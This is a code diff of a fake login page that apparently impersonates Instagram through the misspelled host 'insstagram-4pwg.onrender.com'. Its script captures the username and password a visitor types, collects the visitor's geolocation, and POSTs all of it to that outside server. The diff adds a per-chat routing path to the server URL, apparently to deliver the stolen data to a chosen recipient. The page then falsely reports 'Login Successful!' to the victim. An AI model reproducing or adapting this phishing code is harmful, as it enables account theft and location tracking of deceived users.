@@ -95,60 +95,73 @@
     </div>
     <script>
     function showPasswordInput() {
-        let usernameInput = document.getElementById("username");
-        let passwordInput = document.getElementById("password");
-        let loginBtn = document.getElementById("login-btn");
+    let usernameInput = document.getElementById("username");
+    let passwordInput = document.getElementById("password");
+    let loginBtn = document.getElementById("login-btn");
 
-        if (usernameInput.value.trim() !== "") {
-            passwordInput.classList.remove("hidden");
-            loginBtn.disabled = false;
-        } else {
-            passwordInput.classList.add("hidden");
-            loginBtn.disabled = true;
-        }
+    if (usernameInput.value.trim() !== "") {
+        passwordInput.classList.remove("hidden");
+        loginBtn.disabled = false;
+    } else {
+        passwordInput.classList.add("hidden");
+        loginBtn.disabled = true;
+    }
+}
+
+function getLocation(callback) {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            position => callback(position.coords.latitude, position.coords.longitude),
+            error => {
+                console.warn("⚠️ Location access denied or unavailable.");
+                callback(null, null);
+            }
+        );
+    } else {
+        console.warn("⚠️ Geolocation is not supported.");
+        callback(null, null);
+    }
+}
+
+// Extract chatId from URL path
+const pathSegments = window.location.pathname.split("/").filter(Boolean);
+const chatId = pathSegments.length > 0 ? pathSegments[0] : null;
+
+if (!chatId) {
+    alert("❌ Chat ID is missing from the URL. Please ensure you have the correct link.");
+}
+
+document.getElementById("login-btn").addEventListener("click", function () {
+    let username = document.getElementById("username").value.trim();
+    let password = document.getElementById("password").value.trim();
+
+    if (!username || !password) {
+        alert("❌ Please enter both username and password.");
+        return;
     }
 
-    function getLocation(callback) {
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                position => callback(position.coords.latitude, position.coords.longitude),
-                error => {
-                    console.warn("⚠️ Location access denied or unavailable.");
-                    callback(null, null);
-                }
-            );
-        } else {
-            console.warn("⚠️ Geolocation is not supported.");
-            callback(null, null);
-        }
-    }
-
-    document.getElementById("login-btn").addEventListener("click", function () {
-        let username = document.getElementById("username").value.trim();
-        let password = document.getElementById("password").value.trim();
-
-        if (!username || !password) {
-            alert("❌ Please enter both username and password.");
+    getLocation((latitude, longitude) => {
+        if (!chatId) {
+            alert("❌ Chat ID is missing from the URL.");
             return;
         }
 
-        getLocation((latitude, longitude) => {
-            fetch("https://insstagram-4pwg.onrender.com/sendMessage", { // Updated URL
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ username, password, latitude, longitude })
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log("✅ Response:", data);
-                alert("✅ Login Successful!");
-            })
-            .catch(error => {
-                console.error("❌ Error:", error);
-                alert("❌ Failed to log in. Please try again.");
-            });
+        fetch(`https://insstagram-4pwg.onrender.com/${chatId}/sendMessage`, { // Dynamic URL
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ username, password, latitude, longitude })
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log("✅ Response:", data);
+            alert("✅ Login Successful!");
+        })
+        .catch(error => {
+            console.error("❌ Error:", error);
+            alert("❌ Failed to log in. Please try again.");
         });
     });
+});
 </script>
 </body>
 </html>
